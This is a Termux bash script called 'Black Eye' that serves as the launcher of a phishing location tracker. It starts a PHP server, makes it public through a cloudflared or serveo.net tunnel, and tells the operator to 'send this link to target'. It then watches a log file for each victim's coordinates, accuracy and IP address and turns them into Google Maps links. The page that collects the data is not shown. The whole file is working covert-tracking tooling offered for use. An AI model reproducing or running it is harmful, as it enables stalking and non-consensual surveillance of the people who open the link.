#!/usr/bin/env bash

# Colors
red='\e[91m'
green='\e[92m'
yellow='\e[93m'
cyan='\e[96m'
blue='\e[94m'
magenta='\e[95m'
purple='\e[35m'
white='\e[97m'
reset='\e[0m'
bold='\e[1m'

# Auto-install required packages
echo -e "${yellow}[+]${reset} ${white}Installing required packages...${reset}"
pkgs=(php openssh wget figlet inotify-tools lolcat termux-api)
for pkg in "${pkgs[@]}"; do
    if ! command -v $pkg >/dev/null 2>&1; then
        echo -e "${cyan}    Installing $pkg...${reset}"
        pkg install $pkg -y >/dev/null 2>&1
    fi
done

# Install cloudflared if not installed
if ! command -v cloudflared >/dev/null 2>&1; then
    echo -e "${cyan}    Installing cloudflared...${reset}"
    pkg install cloudflared -y >/dev/null 2>&1
fi

# Animated Banner Function
show_banner() {
    clear
    
    # Animated Matrix-style intro
    echo -e "${green}Initializing Black Eye Protocol...${reset}"
    sleep 0.5
    for i in {1..3}; do
        echo -n "."
        sleep 0.3
    done
    echo ""
    sleep 0.5
    echo -e "${red}    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ███████╗██╗   ██╗███████╗${reset}"
    echo -e "${yellow}    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝╚██╗ ██╔╝██╔════╝${reset}"
    echo -e "${green}    ██████╔╝██║     ███████║██║     █████╔╝     █████╗   ╚████╔╝ █████╗  ${reset}"
    echo -e "${cyan}    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██╔══╝    ╚██╔╝  ██╔══╝  ${reset}"
    echo -e "${blue}    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ███████╗   ██║   ███████╗${reset}"
    echo -e "${purple}    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝   ╚═╝   ╚══════╝${reset}"
    echo -e "${magenta}╔═══════════════════════════════════════════════════════════════════════════╗${reset}"
    echo -e "${magenta}╠═══════════════════════════════════════════════════════════════════════════╣${reset}"
    echo -e "${magenta}║${reset}  ${yellow}⚡ LIVE LOCATION TRACKER  •      ⚡${reset}  ${magenta}║${reset}"
    echo -e "${magenta}╠═══════════════════════════════════════════════════════════════════════════╣${reset}"
    echo -e "${magenta}║${reset}  ${cyan}Created by:${reset} ${green}ATHEX${reset} ${cyan}YouTube:${reset} ${red}@inziXploit444${reset}  ${magenta}║${reset}"
    echo -e "${magenta}╠═══════════════════════════════════════════════════════════════════════════╣${reset}"
    echo -e "${magenta}║${reset}  ${purple}[ SYSTEM STATUS ]${reset}  ${green}✓ ONLINE${reset}  ${purple}[ MODE ]${reset}  ${yellow}⚠️ STEALTH${reset}      ${magenta}║${reset}"
    echo -e "${magenta}╚═══════════════════════════════════════════════════════════════════════════╝${reset}"
    echo ""
}
show_banner
echo -e "${bold}${cyan}⚡ SELECT ATTACK VECTOR ⚡${reset}\n"
echo -e "${green}  [1]${reset} ${white}LOCALHOST${reset}        ${cyan}→${reset} ${yellow}127.0.0.1:8080${reset}"
echo -e "${cyan}  [2]${reset} ${white}CLOUDFLARED${reset}      ${cyan}→${reset} ${yellow}Public URL (Recommended)${reset}"
echo -e "${magenta}  [3]${reset} ${white}SERVEO.NET${reset}       ${cyan}→${reset} ${yellow}SSH Tunnel${reset}"
echo ""
echo -ne "${red}⌨️${reset} ${green}Enter choice [1-3]:${reset} ${cyan}"
read opt
echo -ne "${reset}"
opt=${opt:-1}
echo -e "\n${yellow}[+]${reset} ${white}Initializing PHP server on${reset} ${cyan}127.0.0.1:8080${reset}${reset}"
mkdir -p logs
killall php >/dev/null 2>&1
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 3
echo -e "${green}    ✓ PHP server started successfully${reset}"
link=""
if [[ $opt == 2 ]]; then
    echo -e "${yellow}[+]${reset} ${white}Deploying Cloudflared tunnel...${reset}"
    killall cloudflared >/dev/null 2>&1
    rm -f .clflog
    cloudflared tunnel --url http://localhost:8080 > .clflog 2>&1 &
    echo -ne "${cyan}    Establishing secure tunnel "
    for i in {1..10}; do
        echo -n "▓"
        sleep 0.3
    done
    echo -e "${reset}\n"
    echo -e "${yellow}[+]${reset} ${white}Fetching public link...${reset}"
    for i in {1..20}; do
        link=$(grep -o "https://[-0-9a-zA-Z.]*\.trycloudflare.com" .clflog | head -n1)
        [[ $link ]] && break
        sleep 1
    done
    [[ -z $link ]] && echo -e "${red}[-] Cloudflared failed!${reset}" && exit 1
elif [[ $opt == 3 ]]; then
    echo -e "${yellow}[+]${reset} ${white}Deploying Serveo.net SSH tunnel...${reset}"
    killall ssh >/dev/null 2>&1
    rm -f .servolog
    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > .servolog 2>&1 &
    echo -ne "${cyan}    Establishing secure tunnel "
    for i in {1..10}; do
        echo -n "▓"
        sleep 0.3
    done
    echo -e "${reset}\n"
    echo -e "${yellow}[+]${reset} ${white}Fetching Serveo link...${reset}"
    for i in {1..20}; do
        link=$(grep -o "https://[a-z0-9.-]*\.serveo\.net" .servolog | head -n1)
        [[ $link ]] && break
        sleep 1
    done
    [[ -z $link ]] && echo -e "${red}[-] Serveo failed!${reset}" && exit 1
else
    link="http://localhost:8080"
    echo -e "${green}    ✓ Localhost mode activated${reset}"
fi
echo -e "\n${red}//////////////////////////////////////////////////////////////////////////${reset}"
echo -e "${red}/${yellow}                 🎯 TARGET LINK GENERATED 🎯                 ${red}/${reset}"
echo -e "${red}...............................................................................${reset}"
echo -e "${red}/${reset}                                                               ${red}/${reset}"
echo -e "${red}/${reset}  ${cyan}→${reset} ${green}Send this link to target:${reset}   ${red}/${reset}"
echo -e "${red}/${reset}  ${bold}${magenta}$link${reset}  ${red}/${reset}"
echo -e "${red}/${reset}                                                               ${red}/${reset}"
echo -e "${red}..............................................................................${reset}\n"
echo -e "${bold}${green}🔍 LIVE TARGET MONITORING ACTIVATED${reset}\n"
echo -e "${yellow}______________________________________________________________________${reset}"
touch locations.txt
chmod 777 locations.txt
last_size=$(stat -c%s locations.txt 2>/dev/null || echo 0)
target_count=0
while true; do
    current_size=$(stat -c%s locations.txt 2>/dev/null || echo 0)
    if [[ $current_size -gt $last_size ]]; then
        new_data=$(tail -c +$((last_size + 1)) locations.txt)
        if [[ $new_data == *"Lat"* ]]; then
            target_count=$((target_count + 1)) 
            lat=$(echo "$new_data" | awk -F 'Lat: ' '{print $2}' | awk '{print $1}')
            lon=$(echo "$new_data" | awk -F 'Lon: ' '{print $2}' | awk '{print $1}')
            acc=$(echo "$new_data" | awk -F 'Acc: ±' '{print $2}' | awk '{print $1}' | tr -d ' ')
            ip=$(echo "$new_data" | awk -F 'IP: ' '{print $2}' | awk '{print $1}')
            time=$(echo "$new_data" | sed 's/.*\[\([^]]*\)\].*/\1/')
            maps_link="https://www.google.com/maps?q=$lat$lon"
            echo -ne "\a" 2>/dev/null || true
            echo -e "\n${red}${reset}"...................................................................
            echo -e "${red}${yellow}              🚨 TARGET #$target_count ACQUIRED! 🚨              ${red}${reset}"
            echo -e "${red}..............................................................................${reset}"
            echo -e "${red}${reset}                                                              ${red}${reset}"
            echo -e "${red}${reset}  ${cyan}⏰${reset} ${white}Time:${reset} ${green}$time${reset}                                   ${red}║${reset}"
            echo -e "${red}${reset}  ${cyan}🌐${reset} ${white}IP:${reset}   ${green}$ip${reset}                                      ${red}║${reset}"
            echo -e "${red}${reset}  ${cyan}📍${reset} ${white}Lat:${reset}  ${yellow}$lat${reset}                                      ${red}║${reset}"
            echo -e "${red}${reset}  ${cyan}📍${reset} ${white}Lon:${reset}  ${yellow}$lon${reset}                                      ${red}║${reset}"
            echo -e "${red}${reset}  ${cyan}🎯${reset} ${white}Acc:${reset}  ${magenta}±$acc m${reset}                                      ${red}║${reset}"
            echo -e "${red}${reset}                                                              ${red}${reset}"
            echo -e "${red}${reset}//////////////////////ATHEX BLACH HAT////////////////////////////////////"
            echo -e "${red}${reset}  ${cyan}🗺️${reset} ${white}Google Maps:${reset}                                              ${red}║${reset}"
            echo -e "${red}${reset}  ${blue}$maps_link${reset}  ${red}║${reset}"
            echo -e "${red}//////////////////////////////////////////////////////////////////////////////${reset}"
            echo ""
            echo "$maps_link" | termux-clipboard-set 2>/dev/null || true
            termux-toast "🎯 Target #$target_count location copied!" 2>/dev/null || true
            termux-vibrate -d 200 2>/dev/null || true
        fi
        last_size=$current_size
    fi
    echo -ne "${cyan}[ Monitoring ]${reset} Waiting for targets ${yellow}⠋${reset}\r"
    sleep 0.3
    echo -ne "${cyan}[ Monitoring ]${reset} Waiting for targets ${yellow}⠙${reset}\r"
    sleep 0.3
    echo -ne "${cyan}[ Monitoring ]${reset} Waiting for targets ${yellow}⠹${reset}\r"
    sleep 0.3
    echo -ne "${cyan}[ Monitoring ]${reset} Waiting for targets ${yellow}⠸${reset}\r"
    sleep 0.1
done
